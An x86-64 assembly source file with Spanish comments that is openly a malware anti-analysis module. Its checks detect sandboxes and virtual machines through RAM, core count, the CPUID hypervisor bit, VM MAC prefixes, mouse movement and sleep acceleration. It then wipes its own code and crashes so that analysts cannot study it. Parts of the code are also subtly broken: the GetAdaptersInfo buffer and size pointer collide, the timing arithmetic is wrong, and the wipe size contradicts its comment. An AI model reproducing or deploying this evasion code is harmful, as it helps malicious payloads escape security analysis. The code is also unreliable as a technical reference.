; ========================================================================
; anti_analysis.asm - Environmental Keying y Anti-Sandbox
; Técnicas: RAM check, CPUID hypervisor bit, MAC prefix check, 
;           mouse movement entropy, sleep acceleration detection
; ========================================================================
BITS 64

; --- Constantes de umbral ---
MIN_RAM_MB      equ 4096          ; 4GB mínimo
MIN_CPU_CORES   equ 2             ; Mínimo 2 cores lógicos
MAX_MOUSE_DELTA equ 10              ; Movimiento máximo permitido (px)
SLEEP_MS        equ 3000            ; 3 segundos para timing check

; ========================================================================
; ENTRY: check_environment
; Salida: RAX = 0 (entorno hostil/sandbox), 1 (entorno limpio)
; ========================================================================
check_environment:
    push rbx r12 r13 r14 r15
    
    ; --- Check 1: RAM total via GlobalMemoryStatusEx ---
    sub rsp, 64
    mov dword [rsp], 64              ; dwLength
    mov rcx, rsp
    call [rel GlobalMemoryStatusEx]
    mov rax, [rsp+8]                 ; ullTotalPhys (bytes)
    shr rax, 20                      ; Convertir a MB
    add rsp, 64
    cmp rax, MIN_RAM_MB
    jb .hostile                      ; RAM < 4GB = sandbox/VM
    
    ; --- Check 2: CPU cores via GetSystemInfo ---
    sub rsp, 32
    mov rcx, rsp
    call [rel GetSystemInfo]
    movzx eax, word [rsp+20]         ; dwNumberOfProcessors
    add rsp, 32
    cmp eax, MIN_CPU_CORES
    jb .hostile                      ; < 2 cores = VM típica
    
    ; --- Check 3: CPUID hypervisor present bit (bit 31 de ECX, leaf 1) ---
    mov eax, 1
    cpuid
    test ecx, (1 << 31)              ; Hypervisor Present Bit
    jnz .hostile                     ; Hypervisor detectado
    
    ; --- Check 4: MAC address check (VMware/VirtualBox prefixes) ---
    call check_mac_prefix
    test eax, eax
    jnz .hostile                     ; MAC prefix de VM conocida
    
    ; --- Check 5: Mouse movement entropy (sandbox = mouse estático) ---
    call check_mouse_entropy
    test eax, eax
    jz .hostile                      ; Mouse no se movió suficiente
    
    ; --- Check 6: Sleep acceleration detection (sandbox acelera sleeps) ---
    call check_sleep_timing
    test eax, eax
    jz .hostile                      ; Sleep fue acelerado
    
    ; --- Todos los checks pasaron ---
    mov eax, 1
    jmp .done
    
.hostile:
    xor eax, eax                     ; Retornar 0 = entorno hostil
    
    ; --- Autodestrucción: sobrescribir payload con zeros y crash ---
    call self_destruct
    
.done:
    pop r15 r14 r13 r12 rbx
    ret

; ========================================================================
; CHECK 4: MAC Address VM Detection
; ========================================================================
check_mac_prefix:
    push rbx r12
    
    ; Obtener adapter info via GetAdaptersInfo (iphlpapi.dll)
    ; Simplificado: verificar si las primeras 3 bytes del MAC coinciden
    ; con prefixes conocidos: 00:05:69 (VMware), 08:00:27 (VirtualBox),
    ; 00:0C:29 (VMware), 00:1C:14 (VMware), 00:50:56 (VMware)
    
    sub rsp, 1024
    mov rcx, rsp                     ; pAdapterInfo
    mov rdx, rsp
    mov dword [rdx], 1024            ; SizePointer
    call [rel GetAdaptersInfo]
    test eax, eax
    jnz .mac_clean                   ; Error = asumir limpio
    
    ; Primer adapter en lista enlazada
    mov rbx, rsp
.mac_loop:
    movzx eax, byte [rbx+400]        ; AddressLength (offset aprox)
    cmp eax, 6
    jne .mac_next
    
    ; Comparar primeros 3 bytes contra tabla de prefixes
    mov eax, [rbx+404]               ; Address[0..3]
    and eax, 0x00FFFFFF              ; Mask a 3 bytes
    
    ; Tabla de prefixes VM (little-endian representation)
    cmp eax, 0x00690500              ; 00:05:69
    je .mac_vm
    cmp eax, 0x00270008              ; 08:00:27
    je .mac_vm
    cmp eax, 0x00290C00              ; 00:0C:29
    je .mac_vm
    cmp eax, 0x00141C00              ; 00:1C:14
    je .mac_vm
    cmp eax, 0x00565000              ; 00:50:56
    je .mac_vm
    
.mac_next:
    mov ebx, [rbx+0]                 ; Next pointer (simplificado)
    test ebx, ebx
    jnz .mac_loop
    
.mac_clean:
    xor eax, eax                     ; 0 = no es VM
    jmp .mac_done
    
.mac_vm:
    mov eax, 1                       ; 1 = VM detectada
    
.mac_done:
    add rsp, 1024
    pop r12 rbx
    ret

; ========================================================================
; CHECK 5: Mouse Entropy (GetCursorPos delta)
; ========================================================================
check_mouse_entropy:
    push rbx r12 r13
    
    sub rsp, 16
    lea rcx, [rsp]                   ; POINT structure
    call [rel GetCursorPos]
    test eax, eax
    jz .mouse_fail
    
    mov ebx, [rsp]                   ; x1
    mov r12d, [rsp+4]                ; y1
    
    ; Sleep 2 segundos y medir de nuevo
    mov ecx, 2000
    call [rel Sleep]
    
    lea rcx, [rsp]
    call [rel GetCursorPos]
    test eax, eax
    jz .mouse_fail
    
    mov r13d, [rsp]                  ; x2
    mov eax, [rsp+4]                 ; y2
    
    ; Calcular Manhattan distance |x2-x1| + |y2-y1|
    sub r13d, ebx
    jns .x_pos
    neg r13d
.x_pos:
    sub eax, r12d
    jns .y_pos
    neg eax
.y_pos:
    add eax, r13d
    
    add rsp, 16
    
    cmp eax, MAX_MOUSE_DELTA
    ja .mouse_ok                     ; Se movió suficiente
    
.mouse_fail:
    xor eax, eax                     ; Mouse estático = sandbox
    pop r13 r12 rbx
    ret
    
.mouse_ok:
    mov eax, 1
    pop r13 r12 rbx
    ret

; ========================================================================
; CHECK 6: Sleep Acceleration Detection
; ========================================================================
check_sleep_timing:
    push rbx r12
    
    ; QueryPerformanceCounter antes
    sub rsp, 16
    lea rcx, [rsp]
    call [rel QueryPerformanceCounter]
    mov rbx, [rsp]                   ; Ticks inicio
    
    ; Sleep de 3 segundos
    mov ecx, SLEEP_MS
    call [rel Sleep]
    
    ; QueryPerformanceCounter después
    lea rcx, [rsp]
    call [rel QueryPerformanceCounter]
    mov r12, [rsp]                   ; Ticks fin
    add rsp, 16
    
    ; Calcular delta en ms (asumiendo ~10MHz QPC freq)
    sub r12, rbx
    ; Frecuencia típica QPC: 10MHz = 10 ticks/ms
    ; Delta esperado: ~3,000,000 ticks para 3s
    ; Si delta < 2,500,000 (2.5s), el sleep fue acelerado
    
    mov rax, r12
    xor rdx, rdx
    mov rcx, 2500000
    div rcx
    test rdx, rdx                    ; Remainder
    jz .timing_ok                    ; >= 2.5M ticks
    
    ; Verificación estricta: si el cociente es 0, fue < 2.5M
    cmp rax, 0
    je .timing_accelerated
    
.timing_ok:
    mov eax, 1                       ; Timing normal
    pop r12 rbx
    ret
    
.timing_accelerated:
    xor eax, eax                     ; Sleep acelerado = sandbox
    pop r12 rbx
    ret

; ========================================================================
; SELFDESTRUCT: Sobrescribir memoria del payload con zeros y crash
; ========================================================================
self_destruct:
    ; Obtener dirección base del payload actual
    call .get_rip
.get_rip:
    pop rax
    
    ; Sobrescribir 64KB a partir del entry point con 0xCC (int3) + 0x00
    mov rdi, rax
    and rdi, -0x1000                 ; Alinear a página
    mov rcx, 0x10000                 ; 64KB
    mov rax, 0xCCCCCCCCCCCCCCCC     ; int3 padding (crash si se ejecuta)
    rep stosq
    
    ; Forzar crash
    int3
    ud2                              ; Undefined instruction (seguro)
    jmp $                            ; Bucle infinito de fallback